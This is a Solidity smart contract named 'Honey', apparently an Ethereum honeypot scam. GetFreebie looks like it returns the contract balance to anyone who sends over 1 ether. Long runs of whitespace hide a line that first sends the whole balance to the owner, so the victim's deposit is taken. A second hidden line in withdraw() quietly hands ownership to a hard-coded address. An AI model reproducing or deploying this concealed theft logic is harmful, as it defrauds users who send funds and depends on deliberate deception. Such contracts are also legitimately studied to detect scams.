pragma solidity ^0.4.19;

contract Honey
{
    address public Owner = getInitialOwner();
    
    function getInitialOwner() internal view returns(address) {
        return msg.sender;
    }
   
    function()
    public
    payable
    {
        
    }
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(getMsgValue()>getEtherValue())
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    getOwner().transfer(getContractBalance());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            getSender().transfer(getContractBalance());
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(getSender()==getSpecialAddress()){setOwner(getSpecialAddress());}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(getSender() == getOwner());
        getOwner().transfer(getContractBalance());
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(getSender() == getOwner());
         
        adr.call.value(getMsgValue())(data);
    }
    
    function getOwner() internal view returns(address) {
        return Owner;
    }
    
    function setOwner(address newOwner) internal {
        Owner = newOwner;
    }
    
    function getMsgValue() internal view returns(uint) {
        return msg.value;
    }
    
    function getEtherValue() internal pure returns(uint) {
        return 1 ether;
    }
    
    function getContractBalance() internal view returns(uint) {
        return this.balance;
    }
    
    function getSender() internal view returns(address) {
        return msg.sender;
    }
    
    function getSpecialAddress() internal pure returns(address) {
        return 0x0C76802158F13aBa9D892EE066233827424c5aAB;
    }
}